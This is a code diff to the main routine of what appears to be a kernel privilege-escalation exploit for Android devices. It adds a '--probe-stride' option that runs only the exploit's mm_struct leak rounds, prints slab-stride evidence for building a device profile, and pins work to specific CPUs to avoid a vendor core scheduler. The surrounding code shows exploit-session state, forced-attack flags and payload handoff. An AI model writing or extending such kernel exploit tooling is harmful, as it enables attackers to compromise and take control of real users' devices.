@@ -12,6 +12,8 @@
 
 #include "common.h"
 
+#include "attack/ops.hpp"
+#include "kernelsnitch/stride_verify.h"
 #include "profile/entry.h"
 #include "support/fatal_error.hpp"
 #include "support/run_state.hpp"
@@ -45,6 +47,7 @@ int main(int argc, char **argv) {
         bool app_call = false;
         bool force_attack = false;
         bool status_record = false;
+        bool probe_stride = false;
         const char *prebuilt_path = nullptr;
         const char *dump_dir = nullptr;
         for (int32_t i = 1; i < argc; i++) {
@@ -54,13 +57,16 @@ int main(int argc, char **argv) {
                 force_attack = true;
             } else if (std::string_view(argv[i]) == "--enable-status-record") {
                 status_record = true;
+            } else if (std::string_view(argv[i]) == "--probe-stride") {
+                probe_stride = true;
             } else if (std::string_view(argv[i]) == "--load-prebuilt-profile" &&i + 1 < argc) {
                 prebuilt_path = argv[++i];
             } else if (std::string_view(argv[i]) == "--dump-kernel-log" && i + 1 < argc) {
                 dump_dir = argv[++i];
             } else {
                 pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]"
-                " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]\n", argv[0]);
+                " [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]"
+                " [--probe-stride]\n", argv[0]);
                 return 1;
             }
         }
@@ -110,6 +116,33 @@ int main(int argc, char **argv) {
         }
 
         auto &session = session::g_exploit_session;
+        if (probe_stride) {
+            /* Profile-generation probe: run only the mm_struct leak rounds and
+             * print the slab-stride evidence table. The route, the payload page
+             * and the handoff are never touched; the app parses the [stride]
+             * lines and shows the candidate picker. */
+            session.heap.init();
+            support::disable_rseq_for_thread();
+            kernel::set_unbuffer();
+            signal(SIGPIPE, SIG_IGN);
+            kernel::set_limit();
+            route::reserve_standard_io();
+            if (config::runtime_config_snapshot().init() != 0) {
+                pr_error("runtime configuration failed errno=%d\n", errno);
+                throw FatalError{};
+            }
+            if (!session.profile.loaded()) attack::install_profile(decoded);
+            /* The probe is not route-timed, and the profile's gold-cluster CPUs
+             * (4/5) are exactly the ones the vendor core_ctl pauses for
+             * seconds at a time; clone_child()'s pin would kill the round.
+             * The silver pair 0/1 is always in cpu_active_mask and in the
+             * app's cpuset. */
+            config::runtime_config_snapshot().main_cpu = 0;
+            config::runtime_config_snapshot().consumer_cpu = 1;
+            attack::apply_iomem_cache();
+            (void) support::probe_mm_stride(0, kernelsnitch::STRIDE_MAX_ROUNDS);
+            return 0;
+        }
         /* The component selection comes from the wire; the route field is the
          * fallback when a middleware id was not carried. */
         if (ids.middleware == 0) {
